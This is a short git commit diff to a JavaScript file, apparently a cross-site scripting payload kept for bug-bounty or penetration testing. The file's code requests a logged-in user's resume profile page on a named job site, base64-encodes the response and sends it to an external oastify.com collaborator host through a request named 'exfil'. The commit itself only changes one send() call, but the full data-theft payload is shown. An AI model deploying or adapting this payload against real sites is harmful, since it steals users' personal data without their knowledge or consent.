b9d45948d4227f11107e9acb3517717506ca6ff6
huynhvanphuc <phucdelete@gmail.com>
2024-07-30 15:02:20 +0700

    Update 5.js

--- assets/js/5.js
+++ assets/js/5.js
@@ -1,6 +1,6 @@
 var xhr  = new XMLHttpRequest();
 xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
-xhr.send(null);
+xhr.send();
 
 var exfil = new XMLHttpRequest();
 exfil.open("GET", "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + btoa(xhr.responseText), false);
